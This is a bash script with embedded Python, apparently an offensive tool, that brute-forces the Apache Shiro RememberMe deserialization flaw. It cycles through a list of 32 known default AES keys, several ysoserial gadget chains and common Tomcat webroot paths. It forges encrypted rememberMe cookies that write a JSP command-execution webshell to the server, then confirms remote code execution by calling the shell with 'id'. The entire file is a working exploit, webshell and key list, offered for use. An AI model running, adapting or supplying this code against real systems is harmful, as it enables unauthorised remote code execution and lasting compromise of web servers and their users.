#!/bin/bash
# shiro_webshell_brute.sh -- Shiro RememberMe webshell brute-force
# Usage: shiro_webshell_brute.sh <ENDPOINT> <TARGET_IP> <TARGET_PORT>
set -e

ENDPOINT="$1"
TARGET_IP="$2"
TARGET_PORT="$3"

if [ -z "$ENDPOINT" ] || [ -z "$TARGET_IP" ]; then
  echo "Usage: $0 <ENDPOINT> <TARGET_IP> <TARGET_PORT>"
  exit 1
fi

JAVA8=""
for p in /usr/lib/jvm/java-8/bin/java /usr/lib/jvm/java-8-openjdk-amd64/bin/java; do
  [ -x "$p" ] && JAVA8="$p" && break
done
if [ -z "$JAVA8" ]; then echo "[-] JDK 8 不可用"; exit 1; fi

python3 -c "
try:
    from Crypto.Cipher import AES; print('pycryptodome OK')
except ImportError:
    from cryptography.hazmat.primitives.ciphers import Cipher; print('cryptography OK')
" 2>/dev/null || { echo "[-] 无 AES 加密库"; exit 1; }

SHELL_JSP='<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);%>'
SHELL_NAME="shiro_test_$(date +%s).jsp"

WEBROOT_PATHS=(
  "/opt/tomcat/webapps/ROOT"
  "/usr/local/tomcat/webapps/ROOT"
  "/var/lib/tomcat/webapps/ROOT"
  "/var/lib/tomcat8/webapps/ROOT"
  "/var/lib/tomcat9/webapps/ROOT"
)

KEYS=(
  "kPH+bIxk5D2deZiIxcaaaA=="
  "4AvVhmFLUs0KTA3Kprsdag=="
  "3AvVhmFLUs0KTA3Kprsdag=="
  "2AvVhdsgUs0FSA3SDFAdag=="
  "Z3VucwAAAAAAAAAAAAAAAA=="
  "wGiHplamyXlVB11UXWol8g=="
  "fCq+/xW488hMTCD+cmJ3aQ=="
  "0AvVhmFLUs0KTA3Kprsdag=="
  "1QWLxg+NYmxraMoxAXu/Iw=="
  "ZnJhbWUxLjYuMA=="
  "L7RioUULEFhRyxM7a2R/Yg=="
  "r0e3c16IdVkouZgk1TKVMg=="
  "bWluZS1hc3NldC1rZXk6QQ=="
  "6ZmI6I2j5Y+R5aSn5ZOlAA=="
  "5aaC5qKm5oqA5pyvAAAAAA=="
  "bWicP0XBL7iLRfMSYSSZnQ=="
  "WcfHGU25gNnTxTlmJMeSpw=="
  "ClLk69oNcA3m+s0jIMIkpg=="
  "Is9zJ3pzNh2cgTHB4ua3+Q=="
  "U3ByaW5nQmxhZGUAAAAAAA=="
  "R29vZCBsdWNrISEhISEhISE="
  "NsZXjXVklWPZwOfkvk6kUA=="
  "GAevYnznvgNCURavBhCr1w=="
  "aU1pcmFjbGVpTWlyYWNsZQ=="
  "ZUdsaGJFshHKlBDbLRvSTw=="
  "SDKOLKn2J1j/2BHjeZwAoQ=="
  "tiVV6g3uZBGfhUGUzwIImQ=="
  "cmVtZW1iZXJNZQAAAAAAAA=="
  "66v1O8keKNV3TTcGPK1wzg=="
  "bXRvbnMAAAAAAAAAAAAAAA=="
  "a2VlcE9uR29pbmdBbmRGaQ=="
  "Bf7MfkNR0axGGpZDB1bABw=="
)

GADGETS=("CommonsBeanutils1" "CommonsCollections2" "CommonsCollections1" "CommonsCollections6" "CommonsCollections3" "CommonsCollections4")

SHELL_B64=$(printf '%s' "$SHELL_JSP" | base64 -w0)

echo "[*] 开始 Shiro 写 webshell 爆破"
echo "[*] 密钥: ${#KEYS[@]} 个, Gadget: ${#GADGETS[@]} 个"

TESTED=0
for gadget in "${GADGETS[@]}"; do
  for webroot in "${WEBROOT_PATHS[@]}"; do
    for key in "${KEYS[@]}"; do
      TESTED=$((TESTED + 1))

      WRITE_CMD="/bin/bash -c {echo,${SHELL_B64}}|{base64,-d}|{tee,${webroot}/${SHELL_NAME}}"

      COOKIE=$(python3 - "$JAVA8" "$gadget" "$WRITE_CMD" "$key" 2>/dev/null <<'PYEOF'
import subprocess, base64, os, sys
java8, gadget, cmd, key_b64 = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
try:
    key = base64.b64decode(key_b64)
    if len(key) != 16:
        sys.exit(1)
except Exception:
    sys.exit(1)
proc = subprocess.run(
    [java8, '-jar', '/opt/ysoserial.jar', gadget, cmd],
    capture_output=True, timeout=15
)
if proc.returncode != 0 or len(proc.stdout) < 50:
    sys.exit(1)
payload = proc.stdout
iv = os.urandom(16)
pad_len = 16 - (len(payload) % 16)
padded = payload + bytes([pad_len] * pad_len)
try:
    try:
        from Crypto.Cipher import AES
        ct = AES.new(key, AES.MODE_CBC, iv).encrypt(padded)
    except ImportError:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
        ct = enc.update(padded) + enc.finalize()
    print(base64.b64encode(iv + ct).decode())
except Exception:
    sys.exit(1)
PYEOF
)

      if [ -z "$COOKIE" ]; then continue; fi

      curl -s -o /dev/null "$ENDPOINT" \
        -H "Cookie: rememberMe=${COOKIE}" \
        --max-time 8 2>/dev/null || true

      if [ $((TESTED % 5)) -eq 0 ]; then
        sleep 1
        RESP=$(curl -s "${ENDPOINT}/${SHELL_NAME}?cmd=id" --max-time 5 2>/dev/null || true)
        if echo "$RESP" | grep -q "uid="; then
          echo ""
          echo "=============================="
          echo "SHIRO_RCE_CONFIRMED"
          echo "SHIRO_KEY=${key}"
          echo "SHIRO_GADGET=${gadget}"
          echo "SHIRO_WEBROOT=${webroot}"
          echo "SHIRO_SHELL=${ENDPOINT}/${SHELL_NAME}?cmd=id"
          echo "OUTPUT: $RESP"
          echo "=============================="
          exit 0
        fi
      fi

      [ $((TESTED % 20)) -eq 0 ] && echo "    进度: $TESTED (${gadget} × ${key:0:12}...)"
    done

    sleep 1
    RESP=$(curl -s "${ENDPOINT}/${SHELL_NAME}?cmd=id" --max-time 5 2>/dev/null || true)
    if echo "$RESP" | grep -q "uid="; then
      echo ""
      echo "SHIRO_RCE_CONFIRMED"
      echo "SHIRO_WEBROOT=${webroot}"
      echo "OUTPUT: $RESP"
      exit 0
    fi
  done
done

echo "[-] 全部 $TESTED 组合测试完毕，未写入 webshell"
echo "ALL_FAILED"
